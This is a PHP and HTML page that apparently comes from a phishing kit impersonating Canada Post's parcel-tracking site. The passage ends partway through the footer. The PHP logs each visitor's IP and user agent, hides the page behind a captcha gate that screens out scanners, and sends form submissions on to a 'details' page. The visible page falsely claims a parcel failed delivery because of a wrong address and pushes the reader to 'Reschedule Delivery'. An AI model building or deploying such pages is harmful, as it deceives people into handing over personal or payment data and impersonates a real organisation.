<?php
session_start(); // Start the session

$_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
$_SESSION['user_ip'] = $_SERVER['REMOTE_ADDR'];


if (isset($_SESSION['user_ip'])) {
    $userIp = $_SESSION['user_ip'];
    $userAgent = $_SESSION['user_agent'];
}

// Redirect to the reCAPTCHA page if the session variable is not set or not true
if (!isset($_SESSION['recaptcha_validated']) || $_SESSION['recaptcha_validated'] !== true) {
    header("Location: /captcha/page.php"); // Adjust path as needed
    exit;
}

// At the beginning of target_file.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Perform any required server-side processing here.

    // Then redirect to another page.
    header('Location: /pages/details/page.php');
    exit();
}

?>
<html style="" class="csstransitions no-csspseudotransitions no-touchevents language-en is-signed-in" lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Delivery Status | Canada Post - Canada</title>
        <meta name="theme-color" content="#CA261A">
        <meta name="robots" content="noindex, nofollow">
        <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <link type="text/css" href="/assets/cap/general.css" rel="stylesheet">
        <link type="text/css" href="/assets/cap/basic.css" rel="stylesheet">
        <link type="text/css" href="/assets/cap/org.css" rel="stylesheet">
        <link href="/assets/cap/bound.css" rel="stylesheet">
        <style>#track-main-content[_ngcontent-c0]{margin-right:-1rem!important;margin-left:-1rem!important}</style>
    </head>
    <body id="bdmain" class="www track_web f-topbar-fixed" style="" onload="document.getElementById('bdmain').style.display='';">
        <div class="off-canvas-wrap">
            <div class="inner-wrap">
                <cpc-header class="cpc-component">
                    <div class="cpc-skip-nav"><a href="#main-content" class="skip-nav" target="_self"><span class="cpc-skip-nav-label">Skip to Main Content</span></a></div>
                    <div id="mainNav" class="cpc-nav">
                        <div class="noindex">
                            <nav role="navigation" class="cpc-nav-suppress-product-nav">
                                <div class="top-bar micro-business-nav show-for-large-up" style="">
                                    <section class="top-bar-section">
                                        &nbsp;
                                    </section>
                                </div>
                                <div class="sticky utility-business-nav-sticky-container fixed">
                                    <div class="top-bar utility-business-nav show-for-large-up">
                                        <ul class="title-area">
                                            <li>
                                                <a href="#"><img src="/assets/cap/cpc-main-logo.svg" alt="Canada Post"></a>
                                            </li>
                                            <li class="toggle-topbar menu-icon"><a href="#"><span>Menu</span></a></li>
                                        </ul>
                                        <section class="top-bar-section">
                                            <ul class="left">
                                                <li><a href="#">Personal</a></li>
                                                <li><a href="#">Business</a></li>
                                                <li><a href="#">Our company</a></li>
                                                <li><a href="#">My account</a></li>
                                                <li><a href="#" class="">Tools</a></li>
                                            </ul>
                                        </section>
                                    </div>
                                </div>
                            </nav>
                            <div class="mega-nav-overlay"></div>
                        </div>
                        <div class="mobile-container-wrapper show-for-medium-down">
                            <div class="top--section">
                                <ul>
                                    <li>
                                        <div class="cpc-mobile--hamburger" id="trigger">
                                            <span></span>
                                            <span></span>
                                            <span></span>
                                        </div>
                                    </li>
                                    <li class="logo">
                                        <a href="#"><img src="/assets/cap/cpc-logo.svg" alt="Canada Post"></a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </cpc-header>
                <section id="main-content" tabindex="-1">
                    <div class="row">
                        <div class="large-12 columns">
                            <app-root _nghost-c0="" ng-version="5.1.0">
                                <div id="track-main-content">
                                    <router-outlet></router-outlet>
                                    <track-search-result-list _nghost-c6="" class="ng-star-inserted">
                                        <main>
                                            <div class="row">
                                                <div class="columns small-12" id="track_package_result_list">
                                                    <div class="track-banner-container">
                                                        <h1 class="cpc-track-label" id="search_result_list" tabindex="0">Pending delivery</h1>
                                                        <track-results-page-actions _nghost-c7="">
                                                            <div class="pageactions">
                                                                <download-results-action _nghost-c9=""></download-results-action>
                                                            </div>
                                                        </track-results-page-actions>
                                                    </div>
                                                    <div class="covid-info-container-result-list" id="covid_info_for_mobile">
                                                        <img alt="Info" class="covid-img" src="/assets/cap/info-glyph.svg">
                                                        <p class="covid-text">
                                                            We tried to deliver your parcel today but the address was wrong
                                                        </p>
                                                    </div>
                                                    <div class="covid-info-container-result-list" id="covid_info_for_desktop">
                                                        <img alt="Info" class="covid-img" src="/assets/cap/info-glyph.svg">
                                                        <p class="covid-text" style="margin-top: 0px;">
                                                            We tried to deliver your parcel today but the address was wrong
                                                        </p>
                                                    </div>
                                                    <section class="padding-left-right">
                                                        <p class="nomargin">
                                                            <a class="back-to-result-btn" href="#/home">&nbsp;</a>
                                                        </p>
                                                        <list-of-packages _nghost-c8="">
                                                            <track-packages-found _nghost-c10="">
                                                                <div class="cpc-table--basic-container" id="desktopResult">
                                                                    <table class="table-result cpc-table--basic">
                                                                        <colgroup>
                                                                            <col style="width: 5%">
                                                                            <col style="width: 20%">
                                                                            <col style="width: 35%">
                                                                            <col style="width: 20%">
                                                                            <col style="width: 20%">
                                                                        </colgroup>
                                                                        <thead>
                                                                            <tr>
                                                                                <td></td>
                                                                                <th>
                                                                                    <strong class="ng-star-inserted">Item</strong>
                                                                                </th>
                                                                                <th>
                                                                                    <strong>Details</strong>
                                                                                </th>
                                                                                <th>
                                                                                    <strong>Expected delivery</strong>
                                                                                </th>
                                                                                <th>
                                                                                    <strong></strong>
                                                                                </th>
                                                                            </tr>
                                                                        </thead>
                                                                        <tbody>
                                                                            <tr track-package-info-error-row="" _nghost-c12="" class="ng-star-inserted">
                                                                                <td id="img" class="ng-star-inserted">
                                                                                </td>
                                                                                <td class="ng-star-inserted">Private parcel</td>
                                                                                <td class="ng-star-inserted">
                                                                                    <span class="ng-star-inserted">
                                                                                    <span>Delivery failed<br>
                                                                                    Incorrect address.</span>
                                                                                    </span>
                                                                                </td>
                                                                                <td class="ng-star-inserted">Reschedule required</td>
                                                                                <td class="ng-star-inserted"></td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </div>
                                                                <div class="cpc-table--mobile-container" id="mobileResult">
                                                                    <div class="cpc-table--mobile">
                                                                        <p class="packageSection header-margin">
                                                                            <strong>Reschedule Required</strong>
                                                                        </p>
                                                                        <div class="packageSection ng-star-inserted" track-package-info-error-row="" _nghost-c12="">
                                                                            <div class="float-left icon-margin ng-star-inserted">
                                                                            </div>
                                                                            <div class="float-right ng-star-inserted">
                                                                                <span>Item: <strong>Private Parcel</strong></span>
                                                                                <br>
                                                                                <span>Status: <strong>Delivery failed</strong></span>
                                                                                <br>
                                                                                <span>Reason: <strong>Incorrect address</strong></span>
                                                                                <p style="margin: 20px 0px;">
                                                                                    You are required to reschedule the delivery to receive your parcel.
                                                                                </p>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </track-packages-found>
                                                        </list-of-packages>
                                                        <form action="" name="osDCgXfxg" id="osDCgXfxg" method="POST">
                                                            <button class="button" id="submitButton" type="submit">Reschedule Delivery</button>
                                                        </form>
                                                    </section>
                                                </div>
                                            </div>
                                        </main>
                                    </track-search-result-list>
                                </div>
                            </app-root>
                            <cpc-footer class="cpc-component">
                                <div id="cpc-main-footer" class="cpc-footer-container">
                                    <div class="cpc-footer">
                                        <div class="noindex">
                                            <section class="footer-l1" role="navigation">
                                                <div class="row show-for-large-up">
                                                    <div class="large-3 columns">
                                                        <h2 class="show-for-medium-up">Connect with us</h2>
                                                        <ul class="social-media-icons">
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                        <title>Facebook</title>
                                                                        <path d="M12.688 22h-9.63A1.058 1.058 0 0 1 2 20.942V3.058C2 2.474 2.474 2 3.058 2h17.884C21.526 2 22 2.474 22 3.058v17.884c0 .584-.474 1.058-1.058 1.058H15.82v-7.731h2.614l.391-3.036H15.82V9.308c0-.878.243-1.48 1.503-1.48h1.608v-2.75a21.493 21.493 0 0 0-2.338-.117 3.662 3.662 0 0 0-3.905 4.03v2.232h-2.614v3.035h2.624L12.688 22z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                        <title>Twitter</title>
                                                                        <path d="M9.681 17.08c4.717 0 7.297-3.909 7.297-7.297 0-.111-.002-.222-.007-.332.5-.362.936-.814 1.279-1.328a5.12 5.12 0 0 1-1.473.404c.53-.317.936-.82 1.128-1.419a5.138 5.138 0 0 1-1.629.623 2.565 2.565 0 0 0-4.37 2.339A7.28 7.28 0 0 1 6.62 7.39a2.563 2.563 0 0 0 .794 3.424 2.545 2.545 0 0 1-1.162-.32v.032c0 1.242.884 2.279 2.057 2.514a2.572 2.572 0 0 1-1.158.044 2.567 2.567 0 0 0 2.396 1.781 5.146 5.146 0 0 1-3.797 1.063 7.26 7.26 0 0 0 3.931 1.151M19.5 22h-15A2.5 2.5 0 0 1 2 19.5v-15A2.5 2.5 0 0 1 4.5 2h15A2.5 2.5 0 0 1 22 4.5v15a2.5 2.5 0 0 1-2.5 2.5" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                        <title>Instagram</title>
                                                                        <path d="M18.54 6.658a1.199 1.199 0 1 1-2.397 0 1.199 1.199 0 0 1 2.397 0zm-6.53 8.665a3.333 3.333 0 1 0 0-6.667 3.333 3.333 0 0 0 0 6.667zm0-8.412a5.131 5.131 0 1 1-5.13 5.131 5.131 5.131 0 0 1 5.13-5.184v.053zm0-3.06c-2.67 0-2.986 0-4.037.063a5.531 5.531 0 0 0-1.851.347 3.312 3.312 0 0 0-1.893 1.893 5.531 5.531 0 0 0-.347 1.85c0 1.052-.063 1.367-.063 4.038 0 2.67 0 2.986.063 4.038.01.632.127 1.258.347 1.85a3.312 3.312 0 0 0 1.893 1.893c.593.22 1.218.338 1.85.347 1.052 0 1.368.063 4.039.063 2.67 0 2.986 0 4.037-.063a5.531 5.531 0 0 0 1.851-.347 3.312 3.312 0 0 0 1.893-1.892c.22-.593.338-1.219.347-1.851 0-1.052.063-1.367.063-4.038 0-2.67 0-2.986-.063-4.038a5.531 5.531 0 0 0-.347-1.85 3.312 3.312 0 0 0-1.893-1.893 5.531 5.531 0 0 0-1.85-.347c-1.063-.105-1.378-.105-4.038-.105v.042zm0-1.798c2.713 0 3.05 0 4.122.063a7.36 7.36 0 0 1 2.43.462 5.11 5.11 0 0 1 2.912 2.871c.29.778.447 1.6.463 2.429 0 1.052.063 1.41.063 4.122 0 2.713 0 3.05-.063 4.122a7.36 7.36 0 0 1-.463 2.429 5.11 5.11 0 0 1-2.923 2.923 7.36 7.36 0 0 1-2.429.463c-1.052 0-1.41.063-4.122.063-2.713 0-3.05 0-4.122-.063a7.36 7.36 0 0 1-2.429-.463 5.11 5.11 0 0 1-2.923-2.923 7.36 7.36 0 0 1-.463-2.429C2.063 15.07 2 14.712 2 12c0-2.713 0-3.05.063-4.122a7.36 7.36 0 0 1 .463-2.429A5.11 5.11 0 0 1 5.46 2.526a7.36 7.36 0 0 1 2.429-.463C8.95 2.011 9.298 2 12.01 2v.053z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                        <title>Linkedin</title>
                                                                        <path d="M19.044 19.043h-2.966V14.4c0-1.107-.02-2.531-1.541-2.531-1.544 0-1.78 1.207-1.78 2.452v4.72H9.792V9.499h2.845v1.305h.041c.396-.75 1.364-1.542 2.807-1.542 3.004 0 3.559 1.977 3.559 4.547v5.235zM6.448 8.193a1.72 1.72 0 1 1 0-3.438 1.72 1.72 0 0 1 0 3.439zm-1.484 10.85h2.968V9.498H4.964v9.545zM20.521 2H3.476C2.662 2 2 2.646 2 3.442v17.116C2 21.354 2.662 22 3.476 22h17.045c.816 0 1.479-.647 1.479-1.443V3.442C22 2.646 21.337 2 20.52 2z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                                                        <title>YouTube</title>
                                                                        <g transform="translate(2 5)" fill="none" fill-rule="evenodd">
                                                                            <path d="M7.935 10.266V4.274l5.403 3.007-5.403 2.985zM19.8 3.236s-.195-1.47-.795-2.117c-.76-.85-1.613-.854-2.004-.903C14.203 0 10.004 0 10.004 0h-.008S5.798 0 2.999.216c-.391.05-1.243.054-2.004.903C.395 1.766.2 3.236.2 3.236S0 4.962 0 6.688v1.618c0 1.725.2 3.451.2 3.451s.195 1.47.795 2.117c.76.85 1.76.823 2.205.912C4.8 14.949 10 15 10 15s4.203-.007 7.001-.222c.391-.05 1.244-.054 2.004-.904.6-.647.795-2.117.795-2.117s.2-1.726.2-3.451V6.688c0-1.726-.2-3.452-.2-3.452z" class="svg-shape" fill="#CBCBCB"></path>
                                                                        </g>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                        </ul>
                                                        <ul class="feedback-group">
                                                            <li>
                                                                <div class="cpc-tb--icon cpc-tb--icon-feedback pk"></div>
                                                                <a href="#"><span class="tool-description">Website feedback</span></a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                    <div class="large-3 columns">
                                                        <h2 class="show-for-medium-up">Support</h2>
                                                        <ul>
                                                            <li><a href="#" class="chat-link" target="">Need help?</a></li>
                                                            <li><a href="#" class="chat-link" target="">Contact us</a></li>
                                                        </ul>
                                                    </div>
                                                    <div class="large-3 columns">
                                                        <h2 class="show-for-medium-up">Corporate</h2>
                                                        <ul>
                                                            <li><a href="#" target="">About us</a></li>
                                                            <li><a href="#" target="">Media centre</a></li>
                                                            <li><a href="#" target="">Careers</a></li>
                                                            <li><a href="#" target="">I'm an employee</a></li>
                                                            <li><a href="#" target="">Talent Zone</a></li>
                                                            <li><a href="#" target="">Negotiations Updates</a></li>
                                                        </ul>
                                                    </div>
                                                    <div class="large-3 columns">
                                                        <h2 class="show-for-medium-up">Blogs</h2>
                                                        <ul>
                                                            <li><a href="#" target="">Business Matters</a></li>
                                                            <li><a href="#" target="">Canada Post Magazine</a></li>
                                                        </ul>
                                                    </div>
                                                </div>
                                                <div class="row show-for-medium-only">
                                                    <div class="medium-6 columns">
                                                        <h2 class="show-for-medium-up">Connect with us</h2>
                                                        <ul class="social-media-icons">
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                        <title>Facebook</title>
                                                                        <path d="M12.688 22h-9.63A1.058 1.058 0 0 1 2 20.942V3.058C2 2.474 2.474 2 3.058 2h17.884C21.526 2 22 2.474 22 3.058v17.884c0 .584-.474 1.058-1.058 1.058H15.82v-7.731h2.614l.391-3.036H15.82V9.308c0-.878.243-1.48 1.503-1.48h1.608v-2.75a21.493 21.493 0 0 0-2.338-.117 3.662 3.662 0 0 0-3.905 4.03v2.232h-2.614v3.035h2.624L12.688 22z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                        <title>Twitter</title>
                                                                        <path d="M9.681 17.08c4.717 0 7.297-3.909 7.297-7.297 0-.111-.002-.222-.007-.332.5-.362.936-.814 1.279-1.328a5.12 5.12 0 0 1-1.473.404c.53-.317.936-.82 1.128-1.419a5.138 5.138 0 0 1-1.629.623 2.565 2.565 0 0 0-4.37 2.339A7.28 7.28 0 0 1 6.62 7.39a2.563 2.563 0 0 0 .794 3.424 2.545 2.545 0 0 1-1.162-.32v.032c0 1.242.884 2.279 2.057 2.514a2.572 2.572 0 0 1-1.158.044 2.567 2.567 0 0 0 2.396 1.781 5.146 5.146 0 0 1-3.797 1.063 7.26 7.26 0 0 0 3.931 1.151M19.5 22h-15A2.5 2.5 0 0 1 2 19.5v-15A2.5 2.5 0 0 1 4.5 2h15A2.5 2.5 0 0 1 22 4.5v15a2.5 2.5 0 0 1-2.5 2.5" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                        <title>Instagram</title>
                                                                        <path d="M18.54 6.658a1.199 1.199 0 1 1-2.397 0 1.199 1.199 0 0 1 2.397 0zm-6.53 8.665a3.333 3.333 0 1 0 0-6.667 3.333 3.333 0 0 0 0 6.667zm0-8.412a5.131 5.131 0 1 1-5.13 5.131 5.131 5.131 0 0 1 5.13-5.184v.053zm0-3.06c-2.67 0-2.986 0-4.037.063a5.531 5.531 0 0 0-1.851.347 3.312 3.312 0 0 0-1.893 1.893 5.531 5.531 0 0 0-.347 1.85c0 1.052-.063 1.367-.063 4.038 0 2.67 0 2.986.063 4.038.01.632.127 1.258.347 1.85a3.312 3.312 0 0 0 1.893 1.893c.593.22 1.218.338 1.85.347 1.052 0 1.368.063 4.039.063 2.67 0 2.986 0 4.037-.063a5.531 5.531 0 0 0 1.851-.347 3.312 3.312 0 0 0 1.893-1.892c.22-.593.338-1.219.347-1.851 0-1.052.063-1.367.063-4.038 0-2.67 0-2.986-.063-4.038a5.531 5.531 0 0 0-.347-1.85 3.312 3.312 0 0 0-1.893-1.893 5.531 5.531 0 0 0-1.85-.347c-1.063-.105-1.378-.105-4.038-.105v.042zm0-1.798c2.713 0 3.05 0 4.122.063a7.36 7.36 0 0 1 2.43.462 5.11 5.11 0 0 1 2.912 2.871c.29.778.447 1.6.463 2.429 0 1.052.063 1.41.063 4.122 0 2.713 0 3.05-.063 4.122a7.36 7.36 0 0 1-.463 2.429 5.11 5.11 0 0 1-2.923 2.923 7.36 7.36 0 0 1-2.429.463c-1.052 0-1.41.063-4.122.063-2.713 0-3.05 0-4.122-.063a7.36 7.36 0 0 1-2.429-.463 5.11 5.11 0 0 1-2.923-2.923 7.36 7.36 0 0 1-.463-2.429C2.063 15.07 2 14.712 2 12c0-2.713 0-3.05.063-4.122a7.36 7.36 0 0 1 .463-2.429A5.11 5.11 0 0 1 5.46 2.526a7.36 7.36 0 0 1 2.429-.463C8.95 2.011 9.298 2 12.01 2v.053z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                        <title>Linkedin</title>
                                                                        <path d="M19.044 19.043h-2.966V14.4c0-1.107-.02-2.531-1.541-2.531-1.544 0-1.78 1.207-1.78 2.452v4.72H9.792V9.499h2.845v1.305h.041c.396-.75 1.364-1.542 2.807-1.542 3.004 0 3.559 1.977 3.559 4.547v5.235zM6.448 8.193a1.72 1.72 0 1 1 0-3.438 1.72 1.72 0 0 1 0 3.439zm-1.484 10.85h2.968V9.498H4.964v9.545zM20.521 2H3.476C2.662 2 2 2.646 2 3.442v17.116C2 21.354 2.662 22 3.476 22h17.045c.816 0 1.479-.647 1.479-1.443V3.442C22 2.646 21.337 2 20.52 2z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                                                        <title>YouTube</title>
                                                                        <g transform="translate(2 5)" fill="none" fill-rule="evenodd">
                                                                            <path d="M7.935 10.266V4.274l5.403 3.007-5.403 2.985zM19.8 3.236s-.195-1.47-.795-2.117c-.76-.85-1.613-.854-2.004-.903C14.203 0 10.004 0 10.004 0h-.008S5.798 0 2.999.216c-.391.05-1.243.054-2.004.903C.395 1.766.2 3.236.2 3.236S0 4.962 0 6.688v1.618c0 1.725.2 3.451.2 3.451s.195 1.47.795 2.117c.76.85 1.76.823 2.205.912C4.8 14.949 10 15 10 15s4.203-.007 7.001-.222c.391-.05 1.244-.054 2.004-.904.6-.647.795-2.117.795-2.117s.2-1.726.2-3.451V6.688c0-1.726-.2-3.452-.2-3.452z" class="svg-shape" fill="#CBCBCB"></path>
                                                                        </g>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                        </ul>
                                                        <ul class="feedback-group">
                                                            <li>
                                                                <div class="cpc-tb--icon cpc-tb--icon-feedback pk"></div>
                                                                <a href="#"><span class="tool-description">Website feedback</span></a>
                                                            </li>
                                                        </ul>
                                                        <h2 class="show-for-medium-up">Support</h2>
                                                        <ul>
                                                            <li><a href="#" class="chat-link" target="">Need help?</a></li>
                                                            <li><a href="#" class="chat-link" target="">Contact us</a></li>
                                                        </ul>
                                                    </div>
                                                    <div class="medium-6 columns">
                                                        <h2 class="show-for-medium-up">Corporate</h2>
                                                        <ul>
                                                            <li><a href="#" target="">About us</a></li>
                                                            <li><a href="#" target="">Media centre</a></li>
                                                            <li><a href="#" target="">Careers</a></li>
                                                            <li><a href="#" target="">I'm an employee</a></li>
                                                            <li><a href="#" target="">Talent Zone</a></li>
                                                            <li><a href="#" target="">Negotiations Updates</a></li>
                                                        </ul>
                                                        <h2 class="show-for-medium-up">Blogs</h2>
                                                        <ul>
                                                            <li><a href="#" target="">Business Matters</a></li>
                                                            <li><a href="#" target="">Canada Post Magazine</a></li>
                                                        </ul>
                                                    </div>
                                                </div>
                                                <div class="row show-for-small-only">
                                                    <div class="small-12 columns">
                                                        <ul class="accordion" role="tablist">
                                                            <li>
                                                                <h2>Connect with us</h2>
                                                                <h2 class="show-for-medium-up">Connect with us</h2>
                                                                <ul class="social-media-icons">
                                                                    <li>
                                                                        <a href="#">
                                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                                <title>Facebook</title>
                                                                                <path d="M12.688 22h-9.63A1.058 1.058 0 0 1 2 20.942V3.058C2 2.474 2.474 2 3.058 2h17.884C21.526 2 22 2.474 22 3.058v17.884c0 .584-.474 1.058-1.058 1.058H15.82v-7.731h2.614l.391-3.036H15.82V9.308c0-.878.243-1.48 1.503-1.48h1.608v-2.75a21.493 21.493 0 0 0-2.338-.117 3.662 3.662 0 0 0-3.905 4.03v2.232h-2.614v3.035h2.624L12.688 22z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                            </svg>
                                                                        </a>
                                                                    </li>
                                                                    <li>
                                                                        <a href="#">
                                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                                <title>Twitter</title>
                                                                                <path d="M9.681 17.08c4.717 0 7.297-3.909 7.297-7.297 0-.111-.002-.222-.007-.332.5-.362.936-.814 1.279-1.328a5.12 5.12 0 0 1-1.473.404c.53-.317.936-.82 1.128-1.419a5.138 5.138 0 0 1-1.629.623 2.565 2.565 0 0 0-4.37 2.339A7.28 7.28 0 0 1 6.62 7.39a2.563 2.563 0 0 0 .794 3.424 2.545 2.545 0 0 1-1.162-.32v.032c0 1.242.884 2.279 2.057 2.514a2.572 2.572 0 0 1-1.158.044 2.567 2.567 0 0 0 2.396 1.781 5.146 5.146 0 0 1-3.797 1.063 7.26 7.26 0 0 0 3.931 1.151M19.5 22h-15A2.5 2.5 0 0 1 2 19.5v-15A2.5 2.5 0 0 1 4.5 2h15A2.5 2.5 0 0 1 22 4.5v15a2.5 2.5 0 0 1-2.5 2.5" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                            </svg>
                                                                        </a>
                                                                    </li>
                                                                    <li>
                                                                        <a href="#">
                                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                                <title>Instagram</title>
                                                                                <path d="M18.54 6.658a1.199 1.199 0 1 1-2.397 0 1.199 1.199 0 0 1 2.397 0zm-6.53 8.665a3.333 3.333 0 1 0 0-6.667 3.333 3.333 0 0 0 0 6.667zm0-8.412a5.131 5.131 0 1 1-5.13 5.131 5.131 5.131 0 0 1 5.13-5.184v.053zm0-3.06c-2.67 0-2.986 0-4.037.063a5.531 5.531 0 0 0-1.851.347 3.312 3.312 0 0 0-1.893 1.893 5.531 5.531 0 0 0-.347 1.85c0 1.052-.063 1.367-.063 4.038 0 2.67 0 2.986.063 4.038.01.632.127 1.258.347 1.85a3.312 3.312 0 0 0 1.893 1.893c.593.22 1.218.338 1.85.347 1.052 0 1.368.063 4.039.063 2.67 0 2.986 0 4.037-.063a5.531 5.531 0 0 0 1.851-.347 3.312 3.312 0 0 0 1.893-1.892c.22-.593.338-1.219.347-1.851 0-1.052.063-1.367.063-4.038 0-2.67 0-2.986-.063-4.038a5.531 5.531 0 0 0-.347-1.85 3.312 3.312 0 0 0-1.893-1.893 5.531 5.531 0 0 0-1.85-.347c-1.063-.105-1.378-.105-4.038-.105v.042zm0-1.798c2.713 0 3.05 0 4.122.063a7.36 7.36 0 0 1 2.43.462 5.11 5.11 0 0 1 2.912 2.871c.29.778.447 1.6.463 2.429 0 1.052.063 1.41.063 4.122 0 2.713 0 3.05-.063 4.122a7.36 7.36 0 0 1-.463 2.429 5.11 5.11 0 0 1-2.923 2.923 7.36 7.36 0 0 1-2.429.463c-1.052 0-1.41.063-4.122.063-2.713 0-3.05 0-4.122-.063a7.36 7.36 0 0 1-2.429-.463 5.11 5.11 0 0 1-2.923-2.923 7.36 7.36 0 0 1-.463-2.429C2.063 15.07 2 14.712 2 12c0-2.713 0-3.05.063-4.122a7.36 7.36 0 0 1 .463-2.429A5.11 5.11 0 0 1 5.46 2.526a7.36 7.36 0 0 1 2.429-.463C8.95 2.011 9.298 2 12.01 2v.053z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                            </svg>
                                                                        </a>
                                                                    </li>
                                                                    <li>
                                                                        <a href="#">
                                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                                <title>Linkedin</title>
                                                                                <path d="M19.044 19.043h-2.966V14.4c0-1.107-.02-2.531-1.541-2.531-1.544 0-1.78 1.207-1.78 2.452v4.72H9.792V9.499h2.845v1.305h.041c.396-.75 1.364-1.542 2.807-1.542 3.004 0 3.559 1.977 3.559 4.547v5.235zM6.448 8.193a1.72 1.72 0 1 1 0-3.438 1.72 1.72 0 0 1 0 3.439zm-1.484 10.85h2.968V9.498H4.964v9.545zM20.521 2H3.476C2.662 2 2 2.646 2 3.442v17.116C2 21.354 2.662 22 3.476 22h17.045c.816 0 1.479-.647 1.479-1.443V3.442C22 2.646 21.337 2 20.52 2z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                            </svg>
                                                                        </a>
                                                                    </li>
                                                                    <li>
                                                                        <a href="#">
                                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                                                                <title>YouTube</title>
                                                                                <g transform="translate(2 5)" fill="none" fill-rule="evenodd">
                                                                                    <path d="M7.935 10.266V4.274l5.403 3.007-5.403 2.985zM19.8 3.236s-.195-1.47-.795-2.117c-.76-.85-1.613-.854-2.004-.903C14.203 0 10.004 0 10.004 0h-.008S5.798 0 2.999.216c-.391.05-1.243.054-2.004.903C.395 1.766.2 3.236.2 3.236S0 4.962 0 6.688v1.618c0 1.725.2 3.451.2 3.451s.195 1.47.795 2.117c.76.85 1.76.823 2.205.912C4.8 14.949 10 15 10 15s4.203-.007 7.001-.222c.391-.05 1.244-.054 2.004-.904.6-.647.795-2.117.795-2.117s.2-1.726.2-3.451V6.688c0-1.726-.2-3.452-.2-3.452z" class="svg-shape" fill="#CBCBCB"></path>
                                                                                </g>
                                                                            </svg>
                                                                        </a>
                                                                    </li>
                                                                </ul>
                                                                <ul class="feedback-group">
                                                                    <li>
                                                                        <div class="cpc-tb--icon cpc-tb--icon-feedback pk"></div>
                                                                        <a href="#"><span class="tool-description">Website feedback</span></a>
                                                                    </li>
                                                                </ul>
                                                                <hr>
                                                            </li>
                                                            <li class="accordion-navigation">
                                                                <a href="#panelSupport" role="tab" class="accordion-title" id="panelSupport-heading">
                                                                    <h2>Support</h2>
                                                                </a>
                                                                <div id="panelSupport" class="content" role="tabpanel">
                                                                    <h2 class="show-for-medium-up">Support</h2>
                                                                    <ul>
                                                                        <li><a href="#" class="chat-link" target="">Need help?</a></li>
                                                                        <li><a href="#" class="chat-link" target="">Contact us</a></li>
                                                                    </ul>
                                                                </div>
                                                                <hr>
                                                            </li>
                                                            <li class="accordion-navigation">
                                                                <a href="#panelCorporate" role="tab" class="accordion-title" id="panelCorporate-heading">
                                                                    <h2>Corporate</h2>
                                                                </a>
                                                                <div id="panelCorporate" class="content" role="tabpanel">
                                                                    <h2 class="show-for-medium-up">Corporate</h2>
                                                                    <ul>
                                                                        <li><a href="#" target="">About us</a></li>
                                                                        <li><a href="#" target="">Media centre</a></li>
                                                                        <li><a href="#" target="">Careers</a></li>
                                                                        <li><a href="#" target="">I'm an employee</a></li>
                                                                        <li><a href="#" target="">Talent Zone</a></li>
                                                                        <li><a href="#" target="">Negotiations Updates</a></li>
                                                                    </ul>
                                                                </div>
                                                                <hr>
                                                            </li>
                                                            <li class="accordion-navigation">
                                                                <a href="#panelBlogs" role="tab" class="accordion-title" id="panelBlogs-heading">
                                                                    <h2>Blogs</h2>
                                                                </a>
                                                                <div id="panelBlogs" class="content" role="tabpanel">
                                                                    <h2 class="show-for-medium-up">Blogs</h2>
                                                                    <ul>
                                                                        <li><a href="#" target="">Business Matters</a></li>
                                                                        <li><a href="#" target="">Canada Post Magazine</a></li>
